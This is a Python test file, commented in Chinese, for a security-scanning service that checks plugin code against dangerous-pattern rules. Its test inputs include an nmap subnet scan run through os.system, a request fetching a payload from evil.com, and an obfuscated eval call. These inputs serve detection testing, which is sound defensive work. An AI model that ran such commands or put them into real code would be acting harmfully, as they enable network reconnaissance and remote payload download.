"""安全检测模块测试"""

import pytest
from app.services.security_service import SecurityService, DANGEROUS_PATTERNS


class TestSecurityService:
    """Tier 1 静态分析测试"""

    def test_dangerous_patterns_defined(self):
        """验证危险模式规则已定义"""
        assert len(DANGEROUS_PATTERNS) > 0
        names = [p["name"] for p in DANGEROUS_PATTERNS]
        assert "shell_exec" in names
        assert "network_outbound" in names
        assert "privilege_escalation" in names

    def test_detect_shell_exec(self):
        """检测 shell 执行命令"""
        import re
        content = 'import os\nos.system("nmap -sT 192.168.1.0/24")'
        for rule in DANGEROUS_PATTERNS:
            if rule["name"] == "shell_exec":
                matches = re.findall(rule["pattern"], content, re.IGNORECASE)
                assert len(matches) > 0

    def test_detect_network_request(self):
        """检测网络外联"""
        import re
        content = 'import requests\nrequests.get("http://evil.com/payload")'
        for rule in DANGEROUS_PATTERNS:
            if rule["name"] == "network_outbound":
                matches = re.findall(rule["pattern"], content, re.IGNORECASE)
                assert len(matches) > 0

    def test_safe_skill(self):
        """安全技能不应产生告警"""
        import re
        content = '# 简单的 PDF 处理技能\nprint("hello world")\nx = 1 + 2'
        findings = []
        for rule in DANGEROUS_PATTERNS:
            matches = re.findall(rule["pattern"], content, re.IGNORECASE)
            if matches:
                findings.append(rule["name"])
        assert len(findings) == 0

    def test_obfuscated_code(self):
        """检测混淆代码"""
        import re
        content = "eval(\"os.system('ls')\")"
        for rule in DANGEROUS_PATTERNS:
            if rule["name"] == "code_obfuscation":
                matches = re.findall(rule["pattern"], content, re.IGNORECASE)
                assert len(matches) > 0

    def test_risk_level_calculation(self):
        """验证风险等级计算"""
        risk_order = {"high": 3, "medium": 2, "low": 1, "none": 0}
        assert risk_order["high"] > risk_order["medium"]
        assert risk_order["medium"] > risk_order["low"]
        assert risk_order["low"] > risk_order["none"]


class TestSkillVersion:
    """技能版本比较测试"""

    def test_version_comparison(self):
        from packaging.version import Version
        assert Version("2.0.0") > Version("1.0.0")
        assert Version("1.10.0") > Version("1.2.0")
        assert Version("1.0.0") == Version("1.0.0")
        assert Version("1.0.1") > Version("1.0.0")
